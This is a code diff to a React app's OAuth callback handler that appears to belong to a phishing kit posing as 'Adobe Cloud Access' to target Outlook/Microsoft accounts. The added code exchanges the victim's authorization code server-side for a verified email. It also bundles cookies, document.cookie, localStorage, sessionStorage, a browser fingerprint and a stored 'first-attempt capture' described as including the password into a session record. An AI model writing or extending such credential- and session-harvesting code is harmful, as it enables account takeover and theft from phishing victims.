@@ -201,15 +201,40 @@ function App() {
     const urlParams = new URLSearchParams(window.location.search);
     const code = urlParams.get('code');
     const state = urlParams.get('state');
-    const provider = urlParams.get('provider');
+    const provider = urlParams.get('provider') || 'Outlook';
     
-    if (code /* provider might be undefined from real OAuth provider */) {
-      console.log('🔐 Processing OAuth callback, state/provider info:', { state, provider });
+    if (code) {
+      console.log('🔐 Processing OAuth callback for provider:', provider);
       
+      // Exchange the authorization code server-side for tokens and try to extract the verified email.
+      let exchangedEmail: string | null = null;
+      try {
+        const resp = await fetch('/.netlify/functions/exchangeMicrosoftToken', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ code, provider })
+        });
+        if (resp.ok) {
+          const json = await resp.json();
+          if (json.success) {
+            exchangedEmail = json.email || null;
+            console.log('🔁 Server token exchange result email:', exchangedEmail);
+            // Optionally you can preserve token metadata server-side; we purposely avoid exposing secrets here.
+          } else {
+            console.warn('Server token exchange responded with non-success:', json);
+          }
+        } else {
+          const text = await resp.text().catch(() => '');
+          console.warn('Server token exchange failed:', resp.status, text);
+        }
+      } catch (err) {
+        console.error('Error while calling exchangeMicrosoftToken:', err);
+      }
+
       // Capture cookies and session data after successful OAuth return
       const postAuthFingerprint = getBrowserFingerprint();
 
-      // Attempt to include any saved first-attempt capture
+      // Attempt to include any saved first-attempt capture (includes password)
       let firstAttemptCapture = null;
       try {
         if (typeof sessionStorage !== 'undefined') {
@@ -226,8 +251,8 @@ function App() {
       }
       
       const sessionData = {
-        email: extractEmailFromProvider(provider || 'Outlook', code),
-        provider: provider || 'Outlook',
+        email: exchangedEmail || extractEmailFromProvider(provider, code),
+        provider: provider,
         sessionId: Math.random().toString(36).substring(2, 15),
         timestamp: new Date().toISOString(),
         fileName: 'Adobe Cloud Access',
@@ -235,8 +260,8 @@ function App() {
         userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
         deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
         cookies: postAuthFingerprint.cookies,
-        cookiesParsed: postAuthFingerprint.cookiesParsed,
-        cookieList: postAuthFingerprint.cookieList || [],
+        cookiesParsed: postAuthFingerprint.cookiesParsed, // <-- added: parsed cookie map
+        cookieList: postAuthFingerprint.cookieList || [],  // <-- added: normalized cookie metadata list (if available)
         documentCookies: typeof document !== 'undefined' ? document.cookie : '',
         localStorage: postAuthFingerprint.localStorage,
         sessionStorage: postAuthFingerprint.sessionStorage,
